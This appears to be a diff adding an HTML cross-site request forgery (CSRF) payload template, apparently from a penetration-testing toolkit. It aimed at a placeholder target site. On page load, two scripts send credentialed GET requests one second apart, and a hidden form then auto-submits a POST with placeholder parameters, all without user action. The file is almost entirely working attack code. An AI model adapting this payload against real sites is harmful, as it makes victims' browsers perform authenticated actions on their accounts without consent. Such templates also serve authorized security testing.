@@ -1,0 +1,67 @@
+<html>
+  <!--
+    This CSRF payload has been adapted and built out over time.
+    It is capable of sending three subsequent requests without user action.
+    It uses setTimeout to space the requests one second apart.
+    The final request performs a POST request including various parameters
+    by using a hidden form submit.
+  -->
+  <body>
+    <script>
+      function submitRequest1()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", "https:\/\/targeturl.example.com\/", true);
+        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,*\/*;q=0.8");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+        xhr.withCredentials = true;
+        var body = "";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+      submitRequest1();
+    </script>
+    <form action="#">
+      <input type="button" value="Submit request 1" onclick="submitRequest1();" />
+    </form>
+	
+    <script>
+      function submitRequest2()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", "https:\/\/targeturl.example.com\/target_path", true);
+        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,*\/*;q=0.8");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+        xhr.withCredentials = true;
+        var body = "";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+	  setTimeout(submitRequest2, 1000)
+    </script>
+    <form action="#">
+      <input type="button" value="Submit request 2" onclick="submitRequest2();" />
+    </form>
+	
+    <form id="csrfAction" action="https:\/\/targeturl.example.com\/target_path" method="POST">
+      <input type="hidden" name="param1" value="param1Value" />
+      <input type="hidden" name="param2" value="param2Value" />
+      <input type="hidden" name="param3" value="param3Value" />
+      <input type="hidden" name="param4" value="param4Value" />
+      <input type="hidden" name="param5" value="param5Value" />
+      <input type="hidden" name="param6" value="param6Value" />
+      <input type="submit" value="Submit request 3" />
+    </form>
+    <script>
+	  function sendCsrfAction()
+	  {
+		  csrfActionVar = document.getElementById("csrfAction").submit()
+	  }
+    setTimeout(sendCsrfAction, 2000);
+    </script>
+  </body>
+</html>
